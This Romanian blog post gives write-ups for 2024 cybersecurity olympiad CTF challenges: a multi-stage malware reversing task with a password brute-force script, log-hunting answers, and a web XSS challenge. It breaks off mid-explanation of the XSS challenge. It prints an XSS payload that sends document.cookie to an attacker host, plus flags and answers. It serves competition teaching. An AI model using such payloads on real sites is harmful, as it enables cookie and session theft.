---
title: '🇷🇴 Rezolvări Olimpiada de Securitate Cibernetică 2024'
Enunt: 'Rezolvări pentru problemele de Jeopardy si Attack/Defense de la Olimpiada de Securitate Cibernetică 2024 / finala ROCSC 2024'
date: 2024-06-02T00:00:00Z
layout: "post.ejs"
permalink: "/rezolvari-osc-rocsc/"
---

În acest blog voi prezenta rezolvările pentru problemele de Jeopardy și Attack/Defense de la faza națională a Olimpiadei de Securitate Cibernetică / finala RoCSC 2024. Voi încerca să prezint atât rezolvările, cât și metodologia prin care am ajuns la acestea.

Aceasta a fost ultima mea ediție, deci sper ca materialele prezentate să fie de folos pentru viitorii participanți, atât pentru OSC/RoCSC, cât și pentru competițiile internaționale ([ECSC](https://ecsc.eu/), [ICC](https://ecsc.eu/icc/), etc.).

# Cuprins

* [**--- Jeopardy OSC + ROCSC ---**](#jeopardy)
* [volatile-mal (300 pts, 11 solves) - Reverse Engineering](#volatile-mal)
* [difficult-situation (51 pts, 117 solves) - Threat hunting](#difficult-situation)
* [discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response](#discover-the-secret-inside)
* [shift (50 pts, 65 solves) - Reverse Engineering](#shift)
* [richnotes (350 pts, 9 solves) - Web](#richnotes)
* [solve-this (267 pts, 13 solves) - Cryptography](#solve-this)
* [spanzuratoarea (467 pts, 1 solve) - Pwn](#spanzuratoarea)
* [zero-shot (50 pts, 34 solves) - ML/AI](#zero-shot)
* [**--- Jeopardy ROCSC ---**](#jeopardy-rocsc)
* [keylogger (433 pts, 7 solves) - Network](#keylogger)
* [magic (467 pts, 3 solves) - Pwn](#magic)
* [decrypt-this (483 pts, 1 solve) - Cryptography](#decrypt-this)
* [**--- Baraj / Attack & Defense ROCSC ---**](#attack-defense)
* [eeeinvoice - A/D](#eeeinvoice)
* [lazypeoninn - A/D](#lazypeoninn)

<a name="jeopardy"></a>
# Jeopardy

Înainte de a vorbi despre probleme, vreau să menționez câteva lucruri despre concursurile CTF de tip Jeopardy. O să mă axez pe partea practică, deoarece nu aș putea acoperi toate aspectele teoretice într-un singur articol.

În principiu, un concurs de tip Jeopardy este doar un concurs în care participanții trebuie să rezolve o mulțime de probleme pregătite de organizatori. Când spunem că rezolvăm o problemă, este suficient să obținem un rezultat numit **flag**, care este de obicei un șir de caractere ce are o anumită formă (de exemplu, `CTF{sha256}`). Platformele de concurs îți oferă și feedback în timp real, deci știi dacă ai obținut flag-ul corect sau nu. În plus, la multe concursuri poți vedea și clasamentul în timp real, pentru a ști cum te clasezi față de alți participanți.

Un lucru fain este că nu contează cum am ajuns la rezultat, ci doar că l-am obținut. Ceea ce este destul de diferit față de alte concursuri sau olimpiade, unde se acordă punctaj și pentru *modalitatea de rezolvare*, sau problemele sunt făcute în așa mod încât există doar un singur mod de rezolvare. **Creativitatea** este importantă și nu ne putem baza pe învățarea unui algoritm universal pentru rezolvarea problemelor.

Un alt lucru important este **gestionarea timpului**. Nu există punctaje parțiale, deci chiar dacă am fost foarte aproape să rezolvăm o problemă, cât timp nu obținem flag-ul nu o să primim niciun punct. În principiu, acest lucru se învață doar cu experiență. Dar dacă ar fi să dau un sfat, aș spune că cel mai mult m-a ajutat să încerc să lucrez la cât mai multe probleme *în paralel*. Astfel, dacă este o problemă pe care știu să o rezolv și trebuie doar să o implementez, pot să mă gândesc în subconștient la rezolvarea altor probleme.

În multe astfel de concursuri, problemele au **punctaj dinamic**: toate problemele încep cu același număr de puncte, dar punctele acelei probleme scad pe măsură ce alți participanți o rezolvă. Aici intervine și partea de **strategie** la care trebuie să ne gândim: problemele grele au mai multe puncte, dar necesită și mai mult timp. Așadar, trebuie să ne gândim dacă vrem să alocăm timp pentru ele sau ne concentrăm pe problemele mai ușoare.

Cele mai întâlnite categorii de probleme sunt:
* **Web** - vulnerabilități de securitate în aplicații web
* **Reverse Engineering** - dezasamblare, decompilare, analiză de cod și înțelegere a unui program fără acces la codul sursă
* **Cryptography** - criptare, decriptare, analiză de cifruri implementate greșit
* **Pwn** - exploatare de vulnerabilități de securitate în aplicațiile native (de obicei cele scrise în C/C++)
* **Forensics** - analiză de fișiere, trafic de rețea, capturi de memorie, etc.
* **Misc** - probleme care nu se încadrează în nicio altă categorie. Nu mereu au treabă cu securitatea, dar necesită cunoștințe tehnice

Pentru concursurile individuale, este important să avem cunoștințe generale despre toate aceste categorii. Dar pentru concursurile de echipă, este important să avem membri cu expertiză în fiecare domeniu, din cauza punctajului dinamic.

<a name="volatile-mal"></a>
## volatile-mal (300 pts, 11 solves) - Reverse Engineering

Enunt:
```
Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(

Scop: Binarul conține mai multe executabile criptate/encodate. Găsiți ultimul binar, iar flag-ul se va găsi în User-Agent.

Advertisment: Tratează fișierul ca și un malware. Nu rula executabilul direct pe computerul tau, ci creează o mașină virtuală pentru a rezolva acest exercițiu! AUTORII NU SUNT RESPONSABILI ÎN NICI UN CAZ PENTRU NICIO SOLICITATIE, DAUNE SAU ALTE RASPUNDERI.

Disclaimer: Treat the file as a malware. Do not run the binary directly on your computer, instead create a virtual machine to solve this challenge! IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY.
```

Înainte să începem a rezolva orice problemă, este important să citim cu atenție enunțul, titlul și categoria pentru a obține indicii care ne pot ajuta să rezolvăm problema. În cazul de față, reverse engineering + malware ne indică faptul că va trebui să analizăm (cel mai probabil) un binar executabil.

Primim un binar numit `poly`. Este bine totuși ca mereu să verificăm tipul fișierului primit cu comanda `file`:
```
$ file poly
poly: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce1a857a7b95699164ae7e5085392079ff5006c3, for GNU/Linux 3.2.0, stripped
```

Deci, este un binar executabil de Linux, arhitectura x86 pe 64 de biți. Următorul pas este să folosim un tool de dezasamblare pentru a analiza codul executabil. Personal, recomand folosirea `IDA` față de `Ghidra` sau `Binary Ninja`, deoarece ne va face viața mai ușoară prin calitatea decompilării.

`IDA` este gratis pentru x86 pe 32/64 de biți și folosește un decompilator în cloud. Pentru alte arhitecturi, putem folosi `Ghidra`, care este un tool gratuit și open-source, oferit de NSA.

Bun, deschidem binarul în IDA și mergem către funcția main. Apăsăm F5 și vedem codul decompilat:
```

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  void *v3; // r12
  __int64 v4; // rbp
  char *envp; // [rsp+8h] [rbp-60h] BYREF
  char *argv[4]; // [rsp+10h] [rbp-58h] BYREF
  char v8[24]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-20h]

  v9 = __readfsqword(0x28u);
  v3 = (void *)sub_1390(&unk_4020);
  v4 = (unsigned int)memfd_create("sysdaemon", 0LL);
  __sprintf_chk(v8, 1LL, 20LL, "%d", v4);
  argv[1] = v8;
  argv[0] = "[kwork/99:1]";
  argv[2] = 0LL;
  envp = 0LL;
  sub_1410(v4, v3);
  fexecve(v4, argv, &envp);
  if ( v9 != __readfsqword(0x28u) )
    start();
  return 0LL;
}
```

Decompilarea arată bine, iar deoarece binarul este `dynamically linked`, avem și funcțiile din libc cu numele lor, deci ne scutește de multă muncă.

Ce face codul dat? Cel mai ușor mi se pare să analizez programul ignorând funcțiile de tip `sub_0000`, pentru a avea o privire de ansamblu.

Vedem că prima funcție apelată este `memfd_create`, care conform manualului:
```
memfd_create() creează un fișier anonim și returnează un descriptor de fișier care se referă la acesta. Fișierul se comportă ca un fișier obișnuit și poate fi modificat, trunchiat, mapat în memorie și așa mai departe. Cu toate acestea, spre deosebire de un fișier obișnuit, acesta trăiește în RAM și are o stocare volatilă. Odată ce toate referințele la fișier sunt eliminate, acesta este eliberat automat.
```
Pe scurt, creează un fișier în memorie. Bun, alt indiciu, deoarece este o tactică comună pentru malware să aibă mai multe stadii, iar aceste stadii să fie criptate și decriptate în timpul execuției.

În rest, funcția main setează parametrii și apelează `fexecve`, care este un fel de `execve` (execută un alt program), dar primește un descriptor de fișier în loc de un path către un fișier. Deci, binarul va executa un alt binar, care va fi creat în memorie.

Așadar, deja avem niște indicii despre ce ar putea face funcțiile `sub_1390` și `sub_1410`. Și le putem privi și în IDA:

```c
unsigned __int8 *__fastcall sub_1390(void *src, int a2)
{
  void *v2; // rax
  unsigned __int8 *v3; // rax
  unsigned __int8 *v4; // r8
  unsigned __int8 *v5; // rdx
  unsigned __int8 *v6; // rsi
  __int64 v7; // rax

  v2 = malloc(a2);
  v3 = (unsigned __int8 *)memcpy(v2, src, a2);
  v4 = v3;
  if ( a2 > 0 )
  {
    v5 = v3;
    v6 = &v3[a2];
    do
    {
      v7 = *v5++;
      *(v5 - 1) = byte_160160[byte_160160[(unsigned __int8)__ROL1__(byte_160260[v7], 4)]];
    }
    while ( v6 != v5 );
  }
  return v4;
}

void __fastcall sub_1410(int fd, char *ptr, __int64 a3)
{
  __int64 v4; // rbx
  size_t v5; // rdx
  ssize_t v6; // rbp

  v4 = 0LL;
  do
  {
    while ( 1 )
    {
      v5 = a3 - v4;
      if ( a3 - v4 > 2147479552 )
        v5 = 2147479552LL;
      v6 = write(fd, &ptr[v4], v5);
      if ( v6 == -1 && *__errno_location() == 4 )
        break;
      v4 += v6;
      if ( v4 == a3 )
        goto LABEL_8;
    }
  }
  while ( v4 != a3 );
LABEL_8:
  free(ptr);
}
```

Ok, în acest punct avem 2 opțiuni: Rescriem implementarea celor 2 funcții într-un program al nostru de Python/C (static analysis). Sau, mai rapid, putem folosi o metodă de analiză dinamică precum un debugger.

Eu totuși am ales altă cale. Revenind la programul nostru `poly` și faptul că este `dynamically linked`, asta înseamnă că funcția `fexecve` nu există de fapt în binar, ci este o funcție din libc care va fi încărcată în timpul rulării programului de către loader. În Linux, ne putem folosi de `LD_PRELOAD` pentru a înlocui funcția `fexecve` cu una proprie, care să salveze rezultatul din acel file descriptor într-un fișier.

```c
// Cod generat de ChatGPT
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>

int fexecve(int fd, char *const argv[], char *const envp[]) {
    printf("fexecve called\n");

    // Dump the contents of the file descriptor to "part2"
    char buffer[4096];
    ssize_t bytes;
    int part2_fd = open("part2", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (part2_fd == -1) {
        perror("open part2");
        return -1;
    }

    // Move to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    // Read from fd and write to part2
    while ((bytes = read(fd, buffer, sizeof(buffer))) > 0) {
        if (write(part2_fd, buffer, bytes) != bytes) {
            perror("write to part2");
            close(part2_fd);
            return -1;
        }
    }
    close(part2_fd);

    // Move back to the beginning of the file descriptor
    lseek(fd, 0, SEEK_SET);

    printf("Dumped the contents of the file descriptor to part2\n");
    printf("Exiting...\n");
    exit(0);
}
```

Trebuie doar să compilăm acest cod ca un shared object (bibliotecă) prin comanda:
```
$ gcc -shared -fPIC -o libintercept.so intercept.c -ldl
```

Și să executăm programul `poly` cu `LD_PRELOAD` setat la calea către biblioteca noastră:
```
$ LD_PRELOAD=./libintercept.so ./poly
fexecve called
Dumped the contents of the file descriptor to part2
Exiting...
```

Desigur, într-un caz real, nu aș recomanda să rulăm un binar necunoscut pe calculatorul nostru. Mai ales pentru că nu am analizat programul complet, și este posibil ca acesta să facă și alte lucruri înaintea funcției `main`. Dar într-un concurs, orice metodă care ne salvează timpul este binevenită.

Okay, am obținut `part2`, rulăm din nou `file` să vedem ce tip de fișier este:
```
$ file part2
part2: Python script, ASCII text executable, with very long lines (64966)
```

`file` ne spune că este un fișier de tip Python, deci putem folosi un editor de text (VSCode/vim) pentru a-l deschide și a vedea conținutul.

Structura programului este următoarea:

```python
#!/usr/bin/python3
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import hashlib
import crypt
import setproctitle
from hmac import compare_digest
import os
import base64
import sys
setproctitle.setproctitle('[nfsd]')
os.close(int(sys.argv[1],10))
salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
mypass = input()
mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
sys.exit() if not compare_digest(mycry,crypt.crypt(mypass,mycry)) else None
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)
enc_msg = base64.b64decode(b'3Y0tpXf93jTzCXI/I3GQqyXX6MCWIw9SgdGj7F5Mp06SrKBNSY9tcGybNpZTUjUYHE7FWnXAVc2mk5fRwblQcfKZ05tLkXpUD') # un base64 foarte lung
fd=os.memfd_create('[kwork/99:1]',0)
fn='/proc/self/fd/'+str(fd)
with open(fn,'wb') as g: g.write(pay)
os.execl(fn,fn)
```

Programul cere o parolă, o verifică folosind `crypt.crypt` (funcție de hashing), și dacă parola este corectă, decriptează stagiul următor folosind `AES` cu o cheie derivată din parolă. Deci, trebuie să găsim parola pentru a putea avansa cu rezolvarea problemei.

O să revin la ce am spus la început, anume că enunțul problemei deseori ascunde indicii importante. În cazul de față, `Mi-a fost promis un tort, dar am primit un ransomware. Mi-au luat până și colecția de muzică rock. :(` din enunț este un indiciu că parola se regăsește în colecția de parole `rockyou.txt`. (aceasta este doar o ipoteză, nu înseamnă *neapărat* că parola se va regăsi în această colecție, și uneori se întâmplă să credem că părți din enunț sunt indicii când de fapt nu sunt, dar este totuși o ipoteză validă și trebuie să o verificăm).

Avem astfel primul tip de problemă care se regăsește în mai multe categorii, și anume *bruteforce*. În acest caz, avem 2 opțiuni: folosim un tool specializat pentru asta (de ex. hashcat), sau ne scriem noi propriul script de bruteforce. În timpul concursului am ales să scriu un script de bruteforce în Python, care să ruleze pe toate core-urile folosind `multiprocessing`. (în plus, consider că este un skill important să știi să scrii propriile scripturi de bruteforce, deoarece în multe cazuri nu putem folosi tool-uri specializate).

```python
import crypt
import multiprocessing
from multiprocessing import Pool

mycry= chr(36)+'1'+chr(36)+'rKtzCK9l'+chr(36)+'jywBrw3Ci9jh5zK52B3/f0'
i = 0

# Read passwords from rockyou.txt
passwords = []
for password in open('rockyou.txt', 'rb').readlines():
    try:
        passwords.append(password.strip().decode())
    except UnicodeDecodeError:
        pass

print(f"Total passwords loaded: {len(passwords)}")

# Define the worker function
def check_password(password):
    if crypt.crypt(password, mycry) == mycry:
        print(f"Password found: {password}")
        return True
    return False

def main():
    with Pool(32) as p:
        result = p.map(check_password, passwords)
        if any(result):
            print("Password cracked successfully.")
        else:
            print("Password not found.")

if __name__ == "__main__":
    main()
```

Lăsăm script-ul să ruleze, și în acest timp ne putem concentra pe alte probleme (nu stăm să pierdem timp uitându-ne la terminal, nu o să-l facă să ruleze mai repede).

Script-ul s-a terminat și am găsit parola `acest000id111este222securizat333`. Știm că parola este folosită pentru a decripta acel base64 prin AES, deci putem scrie un script de Python care să facă asta (practic ce am găsit în part2, dar fără să și executăm binarul):

```python
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

x = open('b64','r').read()

import base64

enc_msg = base64.b64decode(x)

mypass = 'acest000id111este222securizat333'

salt = b'asdfghjklqwertyu'
iv = b'0988765432112345'
key = hashlib.pbkdf2_hmac('sha256', mypass.encode('utf-8'), salt, 100000, 32)

pay = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(enc_msg), AES.block_size)

open('part3', 'wb').write(pay)
```

Desigur, rulăm comanda `file` pentru a vedea ce tip de fișier este `part3`:
```bash
$ file part3
part3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped
```

Și avem iar de-a face cu un binar. Dacă îl deschidem în IDA, o să vedem că este un binar complex cu mii de funcții. Așadar, în cazul de față, cel mai simplu este să încercăm să vedem dacă putem găsi flag-ul cu `strings`, pentru a nu pierde timp analizând codul.

```bash
$ strings part3 | grep CTF
mettle -U "TYtji7XTYf+edph0+DMxkQ==" -G "AAAAAAAAAAAAAAAAAAAAAA==" -u "https://127.0.0.1:12312/7soSKNhkUQW2o7Ch0OYZRAlA7q-vi16LBcoLNylkFX0YrS3mXA6__qNlVSC|--ua 'Mozilla/5.0 CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}'" -d "0" -o "" -b "0"
```

Și da, am obținut flag-ul, fără să mai stăm să analizăm `part3`. Flag-ul a fost în User Agent, așa cum a fost precizat în enunț.

**CTF{cbbd0c7297c67db7bc3c0e4faec3c057d2fa0afe3eb058e439a40e88b5ee7a32}**

<a name="difficult-situation"></a>
## difficult-situation (51 pts, 117 solves) - Threat hunting

Enunt:
```
Investighează alertele de pe acest sistem compromis folosind Elasticsearch și ajută-ne să obținem răspunsurile necesare pentru a rezolva acest incident de securitate.

Pentru a obține acces la datele colectate, selectează Kibana -: Discover -: și alege 2018 ca și an de start pentru setarea timeframe-ului.
```

Problema de forensics. Avem la dispoziție o instanță de Kibana, unde putem căuta în loguri. În general, Kibana și Elasticsearch sunt folosite împreună cu Logstash pentru a forma ELK Stack, care poate fi folosit ca un SIEM (Security Information and Event Management). Un SIEM este un sistem care colectează date de la diferite surse și le transformă într-un format pe care îl putem analiza prin query-uri. Cu aceste query-uri putem să creăm dashboard-uri, alerte și să investigăm incidente de securitate. Cel mai important lucru atunci când lucrăm cu un SIEM este să selectăm intervalul de timp corect, așa cum este menționat și în enunț.

Avem 3 întrebări la care trebuie să răspundem.

1. Q1. Identifică IP-ul mașinii compromise.
   * Din dashboard, putem filtra prin interfața grafică pentru evenimente care conțin IP sursă / destinație. Pentru că este vorba despre o mașină compromisă, putem presupune că este vorba despre un eveniment ce conține un IP privat (10.x.x.x, 192.168.x.x, 172.16.x.x). Într-un eveniment găsim IP-ul **10.1.30.102**, care este și primul flag.
   
2. Q2. Unele evenimente din Kibana au status code 200. Identifică IP-ul sursă al acestor evenimente.
   * Ne folosim iar de interfața grafică din Kibana și selectăm doar evenimentele care au status code 200. Deoarece nu sunt chiar atât de multe evenimente în loguri și nu avem o limită de încercări, putem să încercăm IP-urile sursă ca flag, până găsim IP-ul **198.105.244.64** corect.
   
3. Q3. Identifică URL path-ul folosit în atac.
   * Revenim iar la interfața grafică și filtrăm evenimentele care conțin path în URL. Vedem că sunt foarte puține evenimente rezultate, și primul rezultat este chiar flag-ul: **/ceva/**.

<a name="discover-the-secret-inside"></a>
## discover-the-secret-inside (52 pts, 64 solves) - Forensics, Incident Response

Enunt:
```
Una din stațiile de lucru din infrastructura noastră a fost compromisă. Te rog să ne ajuți cu câteva informații.
```

Q1. Identifică ce soluție a încercat să descarce de pe Internet utilizatorul calculatorului compromis după ce acesta a semnalat un comportament suspicios a stației de lucru. (Points: 13)
<br> Format: term1

**chkrootkit**

Q2. Identifică soluția ce permite crearea unui thread-feed unde se pot urmări amenințările cbernetice, ce este instalată pe sistemul compromis (Points: 13)
<br> Format: acronimul numelui întreg a soluției folosite

**misp**

Q3. Care este ultima comandă executată de atacator pe sistem? (Points: 13)
<br> Format: term1 term2 term3

**sudo groupadd admin**

Q4. Identifică IP-ul stației de lucru compromise. (Points: 13)
<br> Format: IPv4 adresă standard

**10.0.8.25**

<a name="shift"></a>
## shift (50 pts, 65 solves) - Reverse Engineering

Enunt:
```
Se dă un binar în C care execută un algoritm în spate.

Să se identifice algoritmul din spate folosind tehnici de Reverse Engineering.

Flag format: CTF{sha256}
```

O problemă introductivă în Reverse Engineering. Ca întotdeauna, începem prin a rula `file` pe fișier:
```
$ file shift
shift: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=eca2a55a7350099798618cf194225d617659da21, for GNU/Linux 3.2.0, stripped
```

Deci, un binar de Linux, arhitectura x86 pe 64 de biți. Dynamically linked și fără simboluri (stripped). Deschidem binarul în IDA și vedem codul decompilat:

```c
__int64 __fastcall main(__int64 argc, char **argv, char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-50h] BYREF
  char v5[24]; // [rsp+30h] [rbp-30h] BYREF
  __int16 v6; // [rsp+48h] [rbp-18h]
  unsigned __int64 v7; // [rsp+58h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  sub_11A9();
  if ( (_DWORD)argc == 2 )
  {
    strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
    v4[25] = 0;
    *(_QWORD *)v5 = 0x908070605040302LL;
    *(_QWORD *)&v5[8] = 0x11100F0E0D0C0B0ALL;
    *(_QWORD *)&v5[16] = 0x1918171615141312LL;
    v6 = 0;
    if ( strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, v5) )
      return 0LL;
    else
      return 0LL;
  }
  else
  {
    puts("[+] We need one more argument");
    return 0xFFFFFFFFLL;
  }
}
```

Am modificat semnătura funcției main, astfel încât să știm unde avem de-a face cu argc și argv. Vedem că programul verifică să fie rulat cu 2 argumente. Și chiar dacă ambele cazuri din if returnează 0, putem să presupunem că trebuie să satisfacem condiția `strlen(argv[1]) == 25 && (unsigned int)sub_124A(argv[1], v4, v5)`.

Când rezolvăm probleme de rev, este bine să notăm orice pare suspect. În cazul de față, avem acest șir de 25 de caractere în v4: `strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");`. Iar al 26-lea caracter este setat manual să fie NULL (adică 0). Cealaltă variabilă suspectă este `v5`, care conține 3 valori de 8 bytes. Aceasta este doar o optimizare făcută de compilator. `v5` este o cheie care este folosită în funcția `sub_124A`. Dar compilatorul a decis să mute valorile cheii câte 8 bytes pentru a fi mai eficient. Cu toate acestea, pattern-ul este destul de evident când privim în hex, pentru că fiecare byte este reprezentat de 2 caractere hex.

Okay, acum să vedem ce face funcția `sub_124A`:
```c
__int64 __fastcall sub_124A(char *a1, char *a2, char *a3)
{
  int v4; // [rsp+24h] [rbp-4h]

  v4 = 0;
  do
  {
    if ( a2[v4] + a3[v4] != a1[v4] )
      return 0LL;
    ++v4;
  }
  while ( a2[v4] && a1[v4] );
  return 1LL;
}
```

Folosim hotkey-ul `N` în IDA și redenumim a1 în argv1, a2 în str (v4 din main) și a3 (v5 din main) în key, v4 în i. Astfel, codul devine mult mai ușor de citit:
```c
__int64 __fastcall sub_124A(char *argv1, char *str, char *key)
{
  int i; // [rsp+24h] [rbp-4h]

  i = 0;
  do
  {
    if ( str[i] + key[i] != argv1[i] )
      return 0LL;
    ++i;
  }
  while ( str[i] && argv1[i] );
  return 1LL;
}
```

Deci, trebuie doar să adunăm key cu str și vom obține parola. Pentru a nu ne complica cu transcrisul lui v5 în Python, e mai simplu să scriem un program în C care ne afișează argumentul corect:
```c
#include <stdio.h>
#include <string.h>

int main() {
  char v4[32];
  strcpy(v4, "QeeanXKkk[ZRS]\\NBUQJ^RUL");
  v4[25] = 0;
  char plus_key[24];

  *(long long int *)plus_key = 0x908070605040302LL;
  *(long long int *)&plus_key[8] = 0x11100F0E0D0C0B0ALL;
  *(long long int *)&plus_key[16] = 0x1918171615141312LL;

  for (int i = 0; i < 24; i++) {
    v4[i] = v4[i] + plus_key[i];
  }
  printf("%s\n", v4);
}
```

Compilăm și rulăm programul:
```
$ gcc solve.c -o solve
$ ./solve
Shift_Stuff_all_The_time
```

Ne conectăm cu netcat la server și introducem parola:
```
$ nc ip port
```

Și primim flag-ul **CTF{f157c4bb8fabb5788ec40e544d29513c3f5166499231efe94db5c4f4dc245c8c}**

<a name="richnotes"></a>
## richnotes (350 pts, 9 solves) - Web

Enunt:
```
Ceva este suspicios cu această aplicație de luat notițe.

Flag format: CTF{sha256}
```

Primim un link către o aplicație web, precum și codul sursă pentru această aplicație. Pentru aplicațiile web, este important să identificăm structura proiectului. În cazul de față:
```
.
├── Dockerfile
├── docker-compose.yml
├── package-lock.json
├── package.json
├── src
│   ├── api
│   │   └── v1
│   │       └── note
│   │           ├── index.ts
│   │           └── schema.ts
│   ├── index.ts
│   ├── types
│   │   └── env.d.ts
│   └── zexpress
│       ├── routing
│       │   └── index.ts
│       └── validation
│           └── index.ts
├── static
│   ├── index.html
│   └── note.html
└── tsconfig.json
```

Avem o aplicație scrisă în Node.js și folosește TypeScript ca limbaj de programare. În `src` putem identifica `api/v1/note`, care pare să fie o **rută**. O rută este doar un mod de a apela codul scris în *backend* folosind protocolul HTTP (de exemplu printr-un request de tipul `GET /api/v1/note HTTP/1.1`).

Este important să identificăm rutele, deoarece ele reprezintă punctele de intrare pe care le avem pentru a putea găsi vulnerabilități în aplicațiile web. `schema.ts` în general o să conțină structurile de date folosite, deci nu o să ne intereseze la început. Hai să aruncăm o privire la `index.ts`.

```ts
import { validateProperty } from 'src/zexpress/validation'
import { PostNote, GetNote } from './schema'
import { ChainableRouter } from 'src/zexpress/routing'
import crypto from 'crypto'
import DOMPurify from 'isomorphic-dompurify'
import * as puppeteer from 'puppeteer'

const chainableRouter = new ChainableRouter()
const noteMap: Record<string, Buffer> = {}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

const spawnBot = async (url: string) => {
  let browser: puppeteer.Browser | null = null
  try {
    browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome-stable',
      headless: 'shell',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--disable-dev-shm-usage',
      ],
    })
    const page = await browser.newPage()

    await page.setCookie({
      name: 'FLAG',
      value: process.env.FLAG || '',
      domain: new URL(url).hostname,
      httpOnly: false,
      secure: false,
      sameSite: 'Lax',
    })
    await page.goto(url, { waitUntil: 'networkidle2' })
    await sleep(parseInt(process.env.TIMEOUT || '10000'))
  } catch (error) {
    console.error('Error encountered:', error)
  } finally {
    if (browser) {
      await browser.close()
    }
  }
}

chainableRouter
  .pipe(validateProperty(PostNote, 'body'))
  .post('/', async (req, res) => {
    const uuid = crypto.randomUUID()
    noteMap[uuid] = Buffer.from(DOMPurify.sanitize(req.content))
    return res.status(200).send({ id: uuid })
  })

chainableRouter
  .pipe(validateProperty(GetNote, 'query'))
  .get('/', async (req, res) => {
    if (Object.prototype.hasOwnProperty.call(noteMap, req.id)) {
      return res
        .status(200)
        .send({ id: req.id, content: noteMap[req.id].toString('ascii') })
    }

    return res.status(404).send({ message: 'Note does not exist' })
  })

chainableRouter
  .pipe(validateProperty(GetNote, 'body'))
  .post('/report', async (req, res) => {
    if (Object.prototype.hasOwnProperty.call(noteMap, req.id)) {
      spawnBot(`${process.env.BASE_URL}/note/${req.id}`)
      return res.status(200).send({
        message: 'Your report has been received and will be reviewed shortly',
      })
    }

    return res.status(404).send({ message: 'Note does not exist' })
  })
```

Observăm câteva lucruri interesante:
* Există o funcție numită `spawnBot` care pornește un proces de tip `puppeteer`, practic o instanță de browser, Google Chrome în acest caz, care poate fi controlată prin cod. Flag-ul se află în cookie, deci știm că avem de-a face cu o problemă de tip *XSS*.
* Avem 3 rute la dispoziție:
    * `GET pe /api/v1/note` cu input-ul `?id=` în query string.
    * `POST pe /api/v1/note` cu input-ul `{"content":"text pe care îl controlăm"}` în body, și content-type application/json.
    * `GET pe /api/v1/note` cu input-ul `?id=`, pentru a trimite acel id către admin, pentru a verifica conținutul. Observăm că admin-ul se va conecta pe `/note/<note_id>`, în loc de `/api/v1/note`.

Cum am știut exact ce input putem aplica rutelor? Ei bine, am menționat `schema.ts`, în acest caz avem `GetNote` și `PostNote` cu următoarele definiții:
```ts
import { z } from 'zod'

export const PostNote = z.object({
  content: z.string().max(4096),
})

export const GetNote = z.object({
  id: z.string().uuid(),
})
```

Unde `zod` este folosit pentru validare. Pentru request-urile GET, parametrii de obicei se trimit în **query string**. Iar pentru POST, de obicei în **body**, dar pot fi trimiși și în **query string** uneori, depinde de server.

Dar cum arată aceste note? Dacă urmărim `src/index.ts`:
```ts
app.get('/note/:id', (_, res) => {
  res.sendFile(path.join(process.cwd(), 'static/note.html'))
})
```
Unde id-ul notei este preluat direct din path (acesta este un alt mod în care se poate trimite informație prin request-uri HTTP).

Okay, știm că vrem să obținem XSS, așa că ne uităm în `note.html`:
```html
  <script>
    window.addEventListener('load', () => {
      const noteId = window.location.pathname.split('/').pop()

      document.querySelector('#reportNoteUrl').addEventListener('click', () => {
        fetch('/api/v1/note/report', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: window.noteId }),
        })
          .then((result) => result.json())
          .then((result) => {
            if (Object.prototype.hasOwnProperty.call(result, 'message')) {
              document.querySelector('#reportMessage').innerHTML =
                result.message
            } else {
              document.querySelector('#reportMessage').innerHTML =
                'Failed to report note'
            }
          })
      })

      fetch(`/api/v1/note/?id=${noteId}`)
        .then((result) => result.json())
        .then((result) => {
          const node = document.querySelector('#content')
          node.innerHTML = result.content
          window.noteId = noteId
        })
    })
  </script>
```

Nu este foarte mult cod. Avem un buton pentru a raporta nota, și un `fetch` făcut atunci când codul HTML s-a încărcat. Importantă este această linie:
```js
node.innerHTML = result.content
```
Conținutul notei o să fie introdus direct ca HTML în pagină. Deci, dacă avem o notă cu conținut HTML de genul: 
```
<img src=x onerror=fetch("//attacker.requestrepo.com/",{method:"POST",body:document.cookie})/>
```
putem obține execuție de cod în JavaScript. Deoarece resursa `x` nu există, se va apela handler-ul `onerror`, care va *exfiltra* flag-ul către requestrepo (sau alt server la care avem acces la loguri).

De ce nu putem introduce direct acest payload în conținutul notei? Ei bine, când nota este salvată pe server, se aplică funcția de sanitizare de la DOMPurify:
```
noteMap[uuid] = Buffer.from(DOMPurify.sanitize(req.content))
```

DOMPurify este o bibliotecă folosită de milioane de site-uri, deci nu trebuie să pierdem timpul încercând să găsim un bypass.

Soluția este subtilă, dar se află în această linie de cod:
```js
.send({ id: req.id, content: noteMap[req.id].toString('ascii') })
```

